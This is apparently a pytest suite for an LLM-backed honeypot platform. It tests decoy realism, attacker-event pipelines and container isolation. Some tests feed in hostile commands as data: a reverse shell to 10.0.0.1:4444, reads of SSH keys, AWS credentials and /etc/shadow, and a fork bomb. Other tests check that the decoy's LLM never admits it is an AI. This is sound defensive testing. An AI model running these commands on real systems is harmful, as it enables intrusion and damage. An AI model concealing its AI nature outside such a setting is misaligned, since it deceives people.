# CI/CDecoy — Testing Framework
# tests/
#
# Four test categories:
# 1. Unit tests        — Component-level logic (fast, no infra needed)
# 2. Fidelity tests    — Decoy convincingness (needs staging cluster)
# 3. Integration tests — End-to-end pipeline verification
# 4. Security tests    — Ensure decoys can't be used against us
#
# Run with: pytest tests/ -v --tb=short
# Run specific category: pytest tests/fidelity/ -v


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  SHARED FIXTURES & CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# tests/conftest.py

import json
import os
import socket
import time
from dataclasses import dataclass
from typing import Optional

import paramiko
import pytest
import requests
import yaml


def pytest_addoption(parser):
    """Custom CLI options for test configuration."""
    parser.addoption(
        "--staging-host", default="localhost",
        help="Staging cluster host for fidelity/integration tests"
    )
    parser.addoption(
        "--staging-ssh-port", default=2222, type=int,
        help="SSH decoy port on staging"
    )
    parser.addoption(
        "--staging-http-port", default=8080, type=int,
        help="HTTP decoy port on staging"
    )
    parser.addoption(
        "--inference-url", default="http://localhost:8000",
        help="Inference gateway URL for LLM tests"
    )
    parser.addoption(
        "--nats-url", default="nats://localhost:4222",
        help="NATS URL for integration tests"
    )
    parser.addoption(
        "--db-dsn",
        default="postgresql://cicdecoy:test@localhost:5432/cicdecoy_test",
        help="TimescaleDB DSN for integration tests"
    )


@dataclass
class StagingConfig:
    host: str
    ssh_port: int
    http_port: int
    inference_url: str
    nats_url: str
    db_dsn: str


@pytest.fixture(scope="session")
def staging(request) -> StagingConfig:
    return StagingConfig(
        host=request.config.getoption("--staging-host"),
        ssh_port=request.config.getoption("--staging-ssh-port"),
        http_port=request.config.getoption("--staging-http-port"),
        inference_url=request.config.getoption("--inference-url"),
        nats_url=request.config.getoption("--nats-url"),
        db_dsn=request.config.getoption("--db-dsn"),
    )


@pytest.fixture
def ssh_client(staging) -> paramiko.SSHClient:
    """Provides a connected SSH client to the staging decoy."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # Use known test credentials
    client.connect(
        hostname=staging.host,
        port=staging.ssh_port,
        username="admin",
        password="admin123",
        timeout=10,
        look_for_keys=False,
        allow_agent=False,
    )
    yield client
    client.close()


@pytest.fixture
def ssh_shell(ssh_client) -> paramiko.Channel:
    """Provides an interactive shell channel."""
    channel = ssh_client.invoke_shell()
    channel.settimeout(10)
    time.sleep(0.5)  # Wait for prompt
    # Drain initial prompt
    if channel.recv_ready():
        channel.recv(4096)
    yield channel
    channel.close()


def send_command(channel: paramiko.Channel, command: str, timeout: float = 5.0) -> str:
    """Send a command and collect the response."""
    channel.send(command + "\n")
    time.sleep(0.3)  # Allow response generation

    output = b""
    deadline = time.time() + timeout
    while time.time() < deadline:
        if channel.recv_ready():
            chunk = channel.recv(65536)
            output += chunk
            if not channel.recv_ready():
                time.sleep(0.1)
                if not channel.recv_ready():
                    break
        else:
            time.sleep(0.05)

    decoded = output.decode("utf-8", errors="replace")
    # Strip the echoed command and prompt from output
    lines = decoded.strip().split("\n")
    # Remove first line (echoed command) and last line (next prompt)
    if len(lines) > 2:
        return "\n".join(lines[1:-1]).strip()
    elif len(lines) == 2:
        return lines[1].strip() if not lines[1].strip().endswith("$") else ""
    return decoded.strip()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  UNIT TESTS — Command Router
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# tests/unit/test_command_router.py

import sys
sys.path.insert(0, "images/ssh-decoy/src")

from session import SessionState
from filesystem import VirtualFilesystem


class TestSessionState:
    """Test session state tracking."""

    def test_initial_state(self):
        state = SessionState(
            hostname="test-host",
            username="testuser",
            uid=1000,
            home="/home/testuser",
            cwd="/home/testuser",
        )
        assert state.username == "testuser"
        assert state.cwd == "/home/testuser"
        assert state.env["USER"] == "testuser"
        assert state.env["HOME"] == "/home/testuser"

    def test_command_history_tracking(self):
        state = SessionState(
            hostname="h", username="u", uid=1000,
            home="/home/u", cwd="/home/u",
        )
        state.update_from_command("whoami", "u")
        state.update_from_command("ls", "file1 file2")
        assert len(state.command_history) == 2
        assert state.command_history[0] == "whoami"

    def test_lateral_movement_tracking(self):
        state = SessionState(
            hostname="h", username="u", uid=1000,
            home="/home/u", cwd="/home/u",
        )
        state.update_from_command("ssh admin@db-prod-01", "")
        assert len(state.connections_attempted) == 1
        assert "ssh" in state.connections_attempted[0]["command"]

    def test_file_creation_tracking(self):
        state = SessionState(
            hostname="h", username="u", uid=1000,
            home="/home/u", cwd="/tmp",
        )
        state.update_from_command("touch /tmp/evil.sh", "")
        assert len(state.files_created) == 1
        assert state.files_created[0]["path"] == "/tmp/evil.sh"

    def test_context_serialization(self):
        state = SessionState(
            hostname="h", username="u", uid=1000,
            home="/home/u", cwd="/home/u",
        )
        ctx = state.to_context_dict()
        assert "hostname" in ctx
        assert "recent_commands" in ctx
        assert isinstance(ctx["env"], dict)


class TestVirtualFilesystem:
    """Test the virtual filesystem."""

    def test_base_skeleton_has_standard_dirs(self):
        fs = VirtualFilesystem.from_profile("")
        assert fs.is_directory("/etc")
        assert fs.is_directory("/home")
        assert fs.is_directory("/tmp")
        assert fs.is_directory("/var/log")
        assert not fs.is_directory("/nonexistent")

    def test_read_etc_passwd(self):
        fs = VirtualFilesystem.from_profile("")
        content = fs.read_file("/etc/passwd")
        assert content is not None
        assert "root:" in content
        assert "sshd:" in content

    def test_read_nonexistent_file(self):
        fs = VirtualFilesystem.from_profile("")
        assert fs.read_file("/nonexistent") is None

    def test_list_directory(self):
        fs = VirtualFilesystem.from_profile("")
        output = fs.list_directory("/etc")
        assert output  # Not empty
        assert "passwd" in output

    def test_list_nonexistent_directory(self):
        fs = VirtualFilesystem.from_profile("")
        output = fs.list_directory("/fake")
        assert "No such file" in output

    def test_list_long_format(self):
        fs = VirtualFilesystem.from_profile("")
        output = fs.list_directory("/etc", long_format=True)
        assert "total" in output
        assert "root" in output   # Owner should appear

    def test_create_file_runtime(self):
        fs = VirtualFilesystem.from_profile("")
        fs.create_file("/tmp/attacker_tool.sh", "#!/bin/bash\necho pwned", "admin")
        content = fs.read_file("/tmp/attacker_tool.sh")
        assert content == "#!/bin/bash\necho pwned"

    def test_create_directory_runtime(self):
        fs = VirtualFilesystem.from_profile("")
        fs.create_directory("/tmp/.hidden_dir", "admin")
        assert fs.is_directory("/tmp/.hidden_dir")

    def test_context_snapshot(self):
        fs = VirtualFilesystem.from_profile("")
        snapshot = fs.get_context_snapshot("/etc")
        assert "cwd" in snapshot
        assert snapshot["cwd"] == "/etc"
        assert isinstance(snapshot["cwd_contents"], list)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  UNIT TESTS — Auth Handler
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# tests/unit/test_auth_handler.py

from unittest.mock import MagicMock
from auth_handler import AuthHandler


def make_config(**overrides):
    config = MagicMock()
    config.auth_mode = overrides.get("auth_mode", "selective")
    config.credentials = overrides.get("credentials", [
        {"username": "admin", "password": "admin123"},
        {"username": "root", "password": "toor"},
    ])
    config.fail_before_success = overrides.get("fail_before_success", 2)
    config.lockout_after = overrides.get("lockout_after", 10)
    config.lockout_duration = overrides.get("lockout_duration", 300)
    return config


class TestAuthHandlerSelective:
    def test_valid_credentials_accepted(self):
        handler = AuthHandler(make_config())
        result = handler.check_password("admin", "admin123", "1.2.3.4")
        assert result.accepted is True

    def test_invalid_password_rejected(self):
        handler = AuthHandler(make_config())
        result = handler.check_password("admin", "wrong", "1.2.3.4")
        assert result.accepted is False

    def test_unknown_user_rejected(self):
        handler = AuthHandler(make_config())
        result = handler.check_password("nobody", "pass", "1.2.3.4")
        assert result.accepted is False

    def test_all_attempts_logged(self):
        handler = AuthHandler(make_config())
        handler.check_password("admin", "wrong1", "1.2.3.4")
        handler.check_password("admin", "wrong2", "1.2.3.4")
        handler.check_password("admin", "admin123", "1.2.3.4")
        attempts = handler.get_all_attempts()
        assert len(attempts) == 3
        assert attempts[0]["password"] == "wrong1"
        assert attempts[2]["accepted"] is True


class TestAuthHandlerRealistic:
    def test_rejects_valid_creds_initially(self):
        handler = AuthHandler(make_config(
            auth_mode="realistic", fail_before_success=2
        ))
        r1 = handler.check_password("admin", "admin123", "1.2.3.4")
        assert r1.accepted is False  # First attempt rejected

    def test_accepts_after_threshold(self):
        handler = AuthHandler(make_config(
            auth_mode="realistic", fail_before_success=2
        ))
        handler.check_password("admin", "admin123", "1.2.3.4")  # Fail 1
        handler.check_password("admin", "admin123", "1.2.3.4")  # Fail 2
        r3 = handler.check_password("admin", "admin123", "1.2.3.4")  # Accept
        assert r3.accepted is True


class TestAuthHandlerOpen:
    def test_any_creds_accepted(self):
        handler = AuthHandler(make_config(auth_mode="open"))
        result = handler.check_password("anything", "whatever", "1.2.3.4")
        assert result.accepted is True


class TestAuthHandlerClosed:
    def test_all_creds_rejected(self):
        handler = AuthHandler(make_config(auth_mode="closed"))
        result = handler.check_password("admin", "admin123", "1.2.3.4")
        assert result.accepted is False


class TestAuthHandlerLockout:
    def test_lockout_after_threshold(self):
        handler = AuthHandler(make_config(lockout_after=3))
        for _ in range(3):
            handler.check_password("admin", "wrong", "1.2.3.4")
        result = handler.check_password("admin", "admin123", "1.2.3.4")
        assert result.accepted is False
        assert result.reason == "Account locked"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  UNIT TESTS — Response Filter (Guardrails)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# tests/unit/test_response_filter.py

sys.path.insert(0, "inference/src")
from response_filter import ResponseFilter


class TestResponseFilter:
    def setup_method(self):
        self.filter = ResponseFilter()

    def test_clean_response_passes_through(self):
        response = "drwxr-xr-x 2 admin admin 4096 Jan 15 09:00 documents"
        assert self.filter.apply(response) == response

    def test_ai_identity_filtered(self):
        response = "I'm an AI language model and I can't actually execute commands."
        result = self.filter.apply(response)
        assert "AI" not in result
        assert "language model" not in result

    def test_simulation_reveal_filtered(self):
        response = "This is a simulated environment for testing purposes."
        result = self.filter.apply(response)
        assert "simulated" not in result.lower()

    def test_platform_name_filtered(self):
        response = "/opt/cicdecoy/config.yaml: permission denied"
        result = self.filter.apply(response)
        assert "cicdecoy" not in result

    def test_infrastructure_path_redacted(self):
        response = "Found: /var/log/decoy/session.log"
        result = self.filter.apply(response)
        assert "/var/log/decoy" not in result

    def test_markdown_stripped(self):
        response = "```bash\nls -la\n```"
        result = self.filter.apply(response)
        assert "```" not in result

    def test_length_enforcement(self):
        response = "\n".join([f"line {i}" for i in range(1000)])
        result = self.filter.apply(response)
        assert len(result.split("\n")) <= 500

    def test_partial_break_salvaged(self):
        response = (
            "total 24\n"
            "drwxr-xr-x 2 admin admin 4096 Jan 15 documents\n"
            "I'm an AI and cannot help further.\n"
            "-rw-r--r-- 1 admin admin  892 Jan 14 config.yml"
        )
        result = self.filter.apply(response)
        assert "documents" in result
        assert "config.yml" in result
        assert "AI" not in result


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  UNIT TESTS — MITRE Mapper
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# tests/unit/test_mitre_mapper.py

sys.path.insert(0, "cti")
from collector.src.ingest import NormalizedEvent
from enrichment.src.mitre_mapper import MITREMapper


class TestMITREMapper:
    def setup_method(self):
        self.mapper = MITREMapper()

    def _make_event(self, command: str) -> NormalizedEvent:
        return NormalizedEvent(
            event_id="test", timestamp="2024-01-01T00:00:00Z",
            decoy_name="test", decoy_tier=3, session_id="test",
            event_type="command.exec", raw_data={"command": command},
        )

    def test_ssh_lateral_movement(self):
        event = self._make_event("ssh admin@db-prod-01")
        self.mapper.enrich(event)
        ids = [t["technique_id"] for t in event.mitre_techniques]
        assert "T1021.004" in ids

    def test_credential_file_access(self):
        event = self._make_event("cat /home/user/.aws/credentials")
        self.mapper.enrich(event)
        ids = [t["technique_id"] for t in event.mitre_techniques]
        assert "T1552.001" in ids

    def test_reverse_shell_detection(self):
        event = self._make_event("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        self.mapper.enrich(event)
        ids = [t["technique_id"] for t in event.mitre_techniques]
        assert "T1059.004" in ids

    def test_nmap_discovery(self):
        event = self._make_event("nmap -sV -p 1-1000 10.0.1.0/24")
        self.mapper.enrich(event)
        ids = [t["technique_id"] for t in event.mitre_techniques]
        assert "T1046" in ids

    def test_benign_command_no_mapping(self):
        event = self._make_event("ls -la")
        self.mapper.enrich(event)
        # ls maps to T1083 (File and Directory Discovery)
        # This IS a technique, so it should map
        assert len(event.mitre_techniques) > 0

    def test_kill_chain_sequence(self):
        commands = [
            "whoami",
            "cat /etc/passwd",
            "cat /home/admin/.ssh/id_rsa",
            "ssh admin@db-prod-01",
        ]
        patterns = self.mapper.analyze_sequence(commands)
        assert len(patterns) > 0
        assert patterns[0]["pattern"] == "kill_chain_progression"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  FIDELITY TESTS — OS Fingerprinting
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# tests/fidelity/nmap_fingerprint_test.py

import subprocess


class TestNmapFingerprint:
    """
    Verify that decoys cannot be fingerprinted as honeypots
    by standard reconnaissance tools.
    """

    def test_os_detection_returns_expected_os(self, staging):
        """nmap -O should identify the decoy as the configured OS."""
        result = subprocess.run(
            ["nmap", "-O", "--osscan-guess",
             "-p", str(staging.ssh_port),
             staging.host],
            capture_output=True, text=True, timeout=60,
        )
        output = result.stdout.lower()
        # Should identify as Linux, not as a honeypot
        assert "linux" in output
        assert "honeypot" not in output
        assert "honeyd" not in output

    def test_service_version_detection(self, staging):
        """nmap -sV should show realistic service versions."""
        result = subprocess.run(
            ["nmap", "-sV",
             "-p", str(staging.ssh_port),
             staging.host],
            capture_output=True, text=True, timeout=30,
        )
        output = result.stdout
        assert "OpenSSH" in output
        # Should NOT show anything honeypot-related
        assert "Cowrie" not in output
        assert "Kippo" not in output
        assert "honeypot" not in output.lower()

    def test_tcp_fingerprint_consistency(self, staging):
        """TCP window size and options should match configured OS."""
        result = subprocess.run(
            ["nmap", "-O", "-v",
             "-p", str(staging.ssh_port),
             staging.host],
            capture_output=True, text=True, timeout=60,
        )
        # Check for reasonable fingerprint accuracy
        # >80% confidence in the OS guess means we're passing
        output = result.stdout
        if "OS details:" in output:
            # Extract confidence percentage if available
            assert "too many fingerprints" not in output.lower()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  FIDELITY TESTS — Banner Grabbing
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# tests/fidelity/banner_grab_test.py


class TestBannerGrab:
    """Verify service banners match expected values."""

    def test_ssh_banner_format(self, staging):
        """SSH banner should be a valid OpenSSH banner."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((staging.host, staging.ssh_port))
        banner = sock.recv(256).decode("utf-8", errors="replace")
        sock.close()

        assert banner.startswith("SSH-2.0-")
        assert "OpenSSH" in banner
        # Should NOT contain honeypot signatures
        assert "libssh" not in banner  # Cowrie signature
        assert "paramiko" not in banner.lower()  # Implementation leak

    def test_ssh_banner_matches_config(self, staging):
        """Banner should match what's in the decoy manifest."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((staging.host, staging.ssh_port))
        banner = sock.recv(256).decode("utf-8", errors="replace").strip()
        sock.close()

        expected = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6"
        assert banner == expected

    def test_http_server_header(self, staging):
        """HTTP Server header should match configuration."""
        try:
            resp = requests.get(
                f"http://{staging.host}:{staging.http_port}/",
                timeout=5,
            )
            server = resp.headers.get("Server", "")
            assert "Apache" in server or "nginx" in server
            assert "Python" not in server  # Implementation leak
            assert "Werkzeug" not in server
        except requests.ConnectionError:
            pytest.skip("HTTP decoy not available")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  FIDELITY TESTS — Interactive Session
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# tests/fidelity/interaction_test.py


class TestInteractiveSession:
    """
    Test multi-command interactive sessions for coherence.
    These tests verify that the decoy maintains consistent
    state across a session and produces realistic output.
    """

    def test_whoami_matches_login_user(self, ssh_shell):
        response = send_command(ssh_shell, "whoami")
        assert response == "admin"

    def test_pwd_returns_home(self, ssh_shell):
        response = send_command(ssh_shell, "pwd")
        assert response.startswith("/home/")

    def test_hostname_matches_config(self, ssh_shell):
        response = send_command(ssh_shell, "hostname")
        assert response  # Non-empty
        assert "\n" not in response  # Single line

    def test_cd_and_pwd_consistent(self, ssh_shell):
        send_command(ssh_shell, "cd /tmp")
        response = send_command(ssh_shell, "pwd")
        assert response == "/tmp"

    def test_cd_nonexistent_fails(self, ssh_shell):
        response = send_command(ssh_shell, "cd /nonexistent_dir")
        assert "No such file or directory" in response

    def test_ls_returns_content(self, ssh_shell):
        response = send_command(ssh_shell, "ls /etc")
        assert "passwd" in response
        assert "hostname" in response

    def test_cat_etc_passwd_has_users(self, ssh_shell):
        response = send_command(ssh_shell, "cat /etc/passwd")
        assert "root:" in response
        assert "/bin/bash" in response

    def test_cat_nonexistent_fails(self, ssh_shell):
        response = send_command(ssh_shell, "cat /this/does/not/exist")
        assert "No such file or directory" in response

    def test_uname_returns_linux(self, ssh_shell):
        response = send_command(ssh_shell, "uname -a")
        assert "Linux" in response
        assert "x86_64" in response

    def test_filesystem_consistency(self, ssh_shell):
        """Files visible in ls should be readable with cat."""
        ls_output = send_command(ssh_shell, "ls /etc/hostname")
        if "No such file" not in ls_output:
            cat_output = send_command(ssh_shell, "cat /etc/hostname")
            assert cat_output  # Should return content, not error

    def test_history_tracks_commands(self, ssh_shell):
        send_command(ssh_shell, "whoami")
        send_command(ssh_shell, "pwd")
        send_command(ssh_shell, "ls")
        response = send_command(ssh_shell, "history")
        assert "whoami" in response
        assert "pwd" in response

    def test_environment_variables(self, ssh_shell):
        send_command(ssh_shell, "export TEST_VAR=cicdecoy_test")
        response = send_command(ssh_shell, "echo $TEST_VAR")
        assert "cicdecoy_test" in response

    def test_process_listing(self, ssh_shell):
        response = send_command(ssh_shell, "ps aux")
        assert "PID" in response or "pid" in response.lower()
        assert "sshd" in response


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  FIDELITY TESTS — Response Timing
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# tests/fidelity/timing_test.py


class TestResponseTiming:
    """
    Verify response latency is realistic. Instant responses
    or uniformly-timed responses are suspicious.
    """

    def test_simple_command_fast(self, ssh_shell):
        """Simple commands should respond in <100ms."""
        start = time.time()
        send_command(ssh_shell, "pwd")
        elapsed = time.time() - start
        assert elapsed < 0.5  # 500ms generous upper bound

    def test_complex_command_slower(self, ssh_shell):
        """Complex commands should take noticeably longer."""
        start = time.time()
        send_command(ssh_shell, "find / -name '*.conf' 2>/dev/null | head -5")
        elapsed = time.time() - start
        assert elapsed > 0.1  # Should not be instant

    def test_timing_has_variance(self, ssh_shell):
        """Repeated commands should not have identical timing."""
        timings = []
        for _ in range(5):
            start = time.time()
            send_command(ssh_shell, "ls /etc")
            timings.append(time.time() - start)

        # Check that timings aren't all identical (±5ms)
        min_t, max_t = min(timings), max(timings)
        # Allow some variance but not too much
        # Real servers have jitter
        assert max_t - min_t > 0.001  # At least 1ms variance

    def test_no_suspiciously_uniform_timing(self, ssh_shell):
        """Guard against all responses taking exactly the same time."""
        timings = []
        commands = ["whoami", "id", "hostname", "uname", "pwd"]
        for cmd in commands:
            start = time.time()
            send_command(ssh_shell, cmd)
            timings.append(time.time() - start)

        # Standard deviation should be > 0
        mean = sum(timings) / len(timings)
        variance = sum((t - mean) ** 2 for t in timings) / len(timings)
        assert variance > 0


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  FIDELITY TESTS — LLM Coherence (Tier 3)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# tests/fidelity/llm_coherence_test.py


class TestLLMCoherence:
    """
    Test that Tier 3 LLM-backed decoys maintain coherence
    across complex multi-command sessions. These are the
    hard tests — they try to trip up the LLM.
    """

    def test_no_ai_self_reference(self, ssh_shell):
        """LLM must never reveal it's an AI."""
        commands_that_might_trigger = [
            "echo 'are you a real server?'",
            "help me with something",
            "what are you?",
        ]
        for cmd in commands_that_might_trigger:
            response = send_command(ssh_shell, cmd)
            response_lower = response.lower()
            assert "i'm an ai" not in response_lower
            assert "language model" not in response_lower
            assert "i can't actually" not in response_lower
            assert "simulated" not in response_lower

    def test_file_consistency_across_commands(self, ssh_shell):
        """A file shown in ls must be readable with cat."""
        ls_out = send_command(ssh_shell, "ls -la /home/")
        # Extract a username from ls output
        for line in ls_out.split("\n"):
            parts = line.split()
            if len(parts) >= 9 and parts[0].startswith("d"):
                dirname = parts[-1]
                if dirname not in (".", ".."):
                    cat_out = send_command(ssh_shell, f"ls /home/{dirname}/")
                    assert "No such file" not in cat_out
                    break

    def test_user_consistency(self, ssh_shell):
        """whoami, id, and /etc/passwd should all agree."""
        whoami = send_command(ssh_shell, "whoami")
        id_out = send_command(ssh_shell, "id")

        assert whoami in id_out

        passwd = send_command(ssh_shell, "cat /etc/passwd")
        assert whoami in passwd

    def test_network_commands_fail_gracefully(self, ssh_shell):
        """Network commands should timeout or fail, not crash."""
        response = send_command(ssh_shell, "ping -c 1 8.8.8.8", timeout=10)
        # Should either timeout or show an error — not crash
        assert response is not None

    def test_no_infrastructure_leaks(self, ssh_shell):
        """Decoy infrastructure should never be visible."""
        commands = [
            "ls /opt/cicdecoy",
            "cat /var/log/decoy/session.log",
            "env | grep -i decoy",
            "ps aux | grep -i inference",
            "netstat -tlnp | grep 8000",
        ]
        for cmd in commands:
            response = send_command(ssh_shell, cmd)
            assert "cicdecoy" not in response.lower()
            assert "inference" not in response.lower()

    def test_repeated_command_consistency(self, ssh_shell):
        """Same command should return same output (deterministic)."""
        r1 = send_command(ssh_shell, "cat /etc/hostname")
        r2 = send_command(ssh_shell, "cat /etc/hostname")
        assert r1 == r2


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  INTEGRATION TESTS — End-to-End Pipeline
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# tests/integration/pipeline_test.py

import asyncio
import nats as nats_lib


class TestEndToEndPipeline:
    """
    Verify the full data path: attacker interaction → NATS →
    CTI pipeline → TimescaleDB → STIX output.
    """

    def test_ssh_command_reaches_nats(self, staging, ssh_shell):
        """A command on the SSH decoy should produce a NATS event."""
        events = []

        async def collect_events():
            nc = await nats_lib.connect(staging.nats_url)
            sub = await nc.subscribe("cicdecoy.decoy.events.*.command.exec")

            send_command(ssh_shell, "id")

            try:
                msg = await asyncio.wait_for(sub.next_msg(), timeout=5)
                events.append(json.loads(msg.data.decode()))
            except asyncio.TimeoutError:
                pass

            await nc.close()

        asyncio.run(collect_events())
        assert len(events) > 0
        assert events[0]["event_type"] == "command.exec"
        assert "id" in events[0]["data"]["command"]

    def test_alert_generated_for_suspicious_command(self, staging, ssh_shell):
        """Suspicious commands should generate alert events."""
        alerts = []

        async def collect_alerts():
            nc = await nats_lib.connect(staging.nats_url)
            sub = await nc.subscribe("cicdecoy.alert.>")

            send_command(ssh_shell, "cat /etc/shadow")

            try:
                msg = await asyncio.wait_for(sub.next_msg(), timeout=5)
                alerts.append(json.loads(msg.data.decode()))
            except asyncio.TimeoutError:
                pass

            await nc.close()

        asyncio.run(collect_alerts())
        assert len(alerts) > 0
        assert alerts[0]["data"]["severity"] in ("high", "critical")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  SECURITY TESTS — Decoy Isolation
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# tests/security/breakout_test.py


class TestDecoyIsolation:
    """
    Ensure decoys cannot be used as a pivot point for
    real attacks against the infrastructure.
    """

    def test_no_real_command_execution(self, ssh_shell):
        """Commands should never execute on the real OS."""
        # Try to touch a file in /tmp — this should NOT
        # create a real file on the host
        send_command(ssh_shell, "touch /tmp/breakout_test_marker")
        assert not os.path.exists("/tmp/breakout_test_marker")

    def test_cannot_reach_real_network(self, ssh_shell):
        """Decoys should not be able to make real outbound connections."""
        response = send_command(ssh_shell, "curl -s http://ifconfig.me", timeout=10)
        # Should timeout or return simulated error, not a real IP
        assert "." not in response or "timed out" in response.lower() or \
               "Connection refused" in response or response == ""

    def test_cannot_access_kubernetes_api(self, ssh_shell):
        """Decoy containers must not have access to the k8s API."""
        response = send_command(
            ssh_shell,
            "curl -sk https://kubernetes.default.svc/api/v1/namespaces",
            timeout=10,
        )
        assert "items" not in response  # Should not return real k8s data

    def test_cannot_read_host_filesystem(self, ssh_shell):
        """No access to the host's real filesystem."""
        response = send_command(ssh_shell, "cat /proc/1/environ")
        # Should return fake content or error, not real host env
        assert "KUBERNETES_SERVICE" not in response

    def test_resource_limits_enforced(self, ssh_shell):
        """Resource-intensive commands should not crash the pod."""
        # Fork bomb attempt — should fail gracefully
        response = send_command(ssh_shell, ":(){ :|:& };:", timeout=5)
        # The decoy should still be responsive after this
        check = send_command(ssh_shell, "whoami", timeout=5)
        assert check  # Should still respond


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  VALIDATION TESTS — Manifest Checking
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# tests/validation/test_manifest_validation.py


class TestManifestValidation:
    """Test the manifest validation logic itself."""

    def test_valid_tier1_manifest(self):
        manifest = {
            "apiVersion": "cicdecoy.io/v1alpha1",
            "kind": "Decoy",
            "metadata": {"name": "test-beacon"},
            "spec": {
                "service": {"type": "ssh", "port": 22},
                "fidelity": {"tier": 1},
                "identity": {
                    "hostname": "test",
                    "os": {"family": "linux"},
                },
                "authentication": {"mode": "closed"},
            },
        }
        errors = validate_manifest(manifest)
        assert len(errors) == 0

    def test_tier3_without_adaptive_fails(self):
        manifest = {
            "apiVersion": "cicdecoy.io/v1alpha1",
            "kind": "Decoy",
            "metadata": {"name": "test-bad"},
            "spec": {
                "service": {"type": "ssh", "port": 22},
                "fidelity": {"tier": 3},  # No adaptive config!
                "identity": {
                    "hostname": "test",
                    "os": {"family": "linux"},
                },
                "authentication": {"mode": "open"},
            },
        }
        errors = validate_manifest(manifest)
        assert any("adaptive" in e.lower() for e in errors)

    def test_tier3_without_guardrails_fails(self):
        manifest = {
            "apiVersion": "cicdecoy.io/v1alpha1",
            "kind": "Decoy",
            "metadata": {"name": "test-bad"},
            "spec": {
                "service": {"type": "ssh", "port": 22},
                "fidelity": {
                    "tier": 3,
                    "adaptive": {
                        "profileRef": "test",
                        "guardrails": {"filterPatterns": []},  # Empty!
                    },
                },
                "identity": {
                    "hostname": "test",
                    "os": {"family": "linux"},
                },
                "authentication": {"mode": "open"},
            },
        }
        errors = validate_manifest(manifest)
        assert any("guardrail" in e.lower() for e in errors)

    def test_invalid_port_fails(self):
        manifest = {
            "apiVersion": "cicdecoy.io/v1alpha1",
            "kind": "Decoy",
            "metadata": {"name": "test-bad"},
            "spec": {
                "service": {"type": "ssh", "port": 99999},
                "fidelity": {"tier": 1},
                "identity": {
                    "hostname": "test",
                    "os": {"family": "linux"},
                },
                "authentication": {"mode": "closed"},
            },
        }
        errors = validate_manifest(manifest)
        assert any("port" in e.lower() for e in errors)


def validate_manifest(manifest: dict) -> list:
    """Simplified validation for testing."""
    errors = []
    spec = manifest.get("spec", {})

    tier = spec.get("fidelity", {}).get("tier", 0)
    if tier < 1 or tier > 3:
        errors.append("Invalid tier: must be 1-3")

    if tier == 3:
        adaptive = spec.get("fidelity", {}).get("adaptive")
        if not adaptive:
            errors.append("Tier 3 requires adaptive configuration")
        elif not adaptive.get("guardrails", {}).get("filterPatterns"):
            errors.append("Tier 3 requires guardrail filter patterns")

    port = spec.get("service", {}).get("port", 0)
    if port < 1 or port > 65535:
        errors.append(f"Invalid port: {port}")

    return errors


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  SECURITY TESTS — Falco Alert Verification
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# tests/security/falco_test.py
#
# These tests verify that Falco rules fire correctly when
# escape-like behavior occurs in decoy containers. Requires
# Falco deployed in the staging cluster.


class TestFalcoAlertVerification:
    """
    Verify that Falco rules detect container escape attempts.

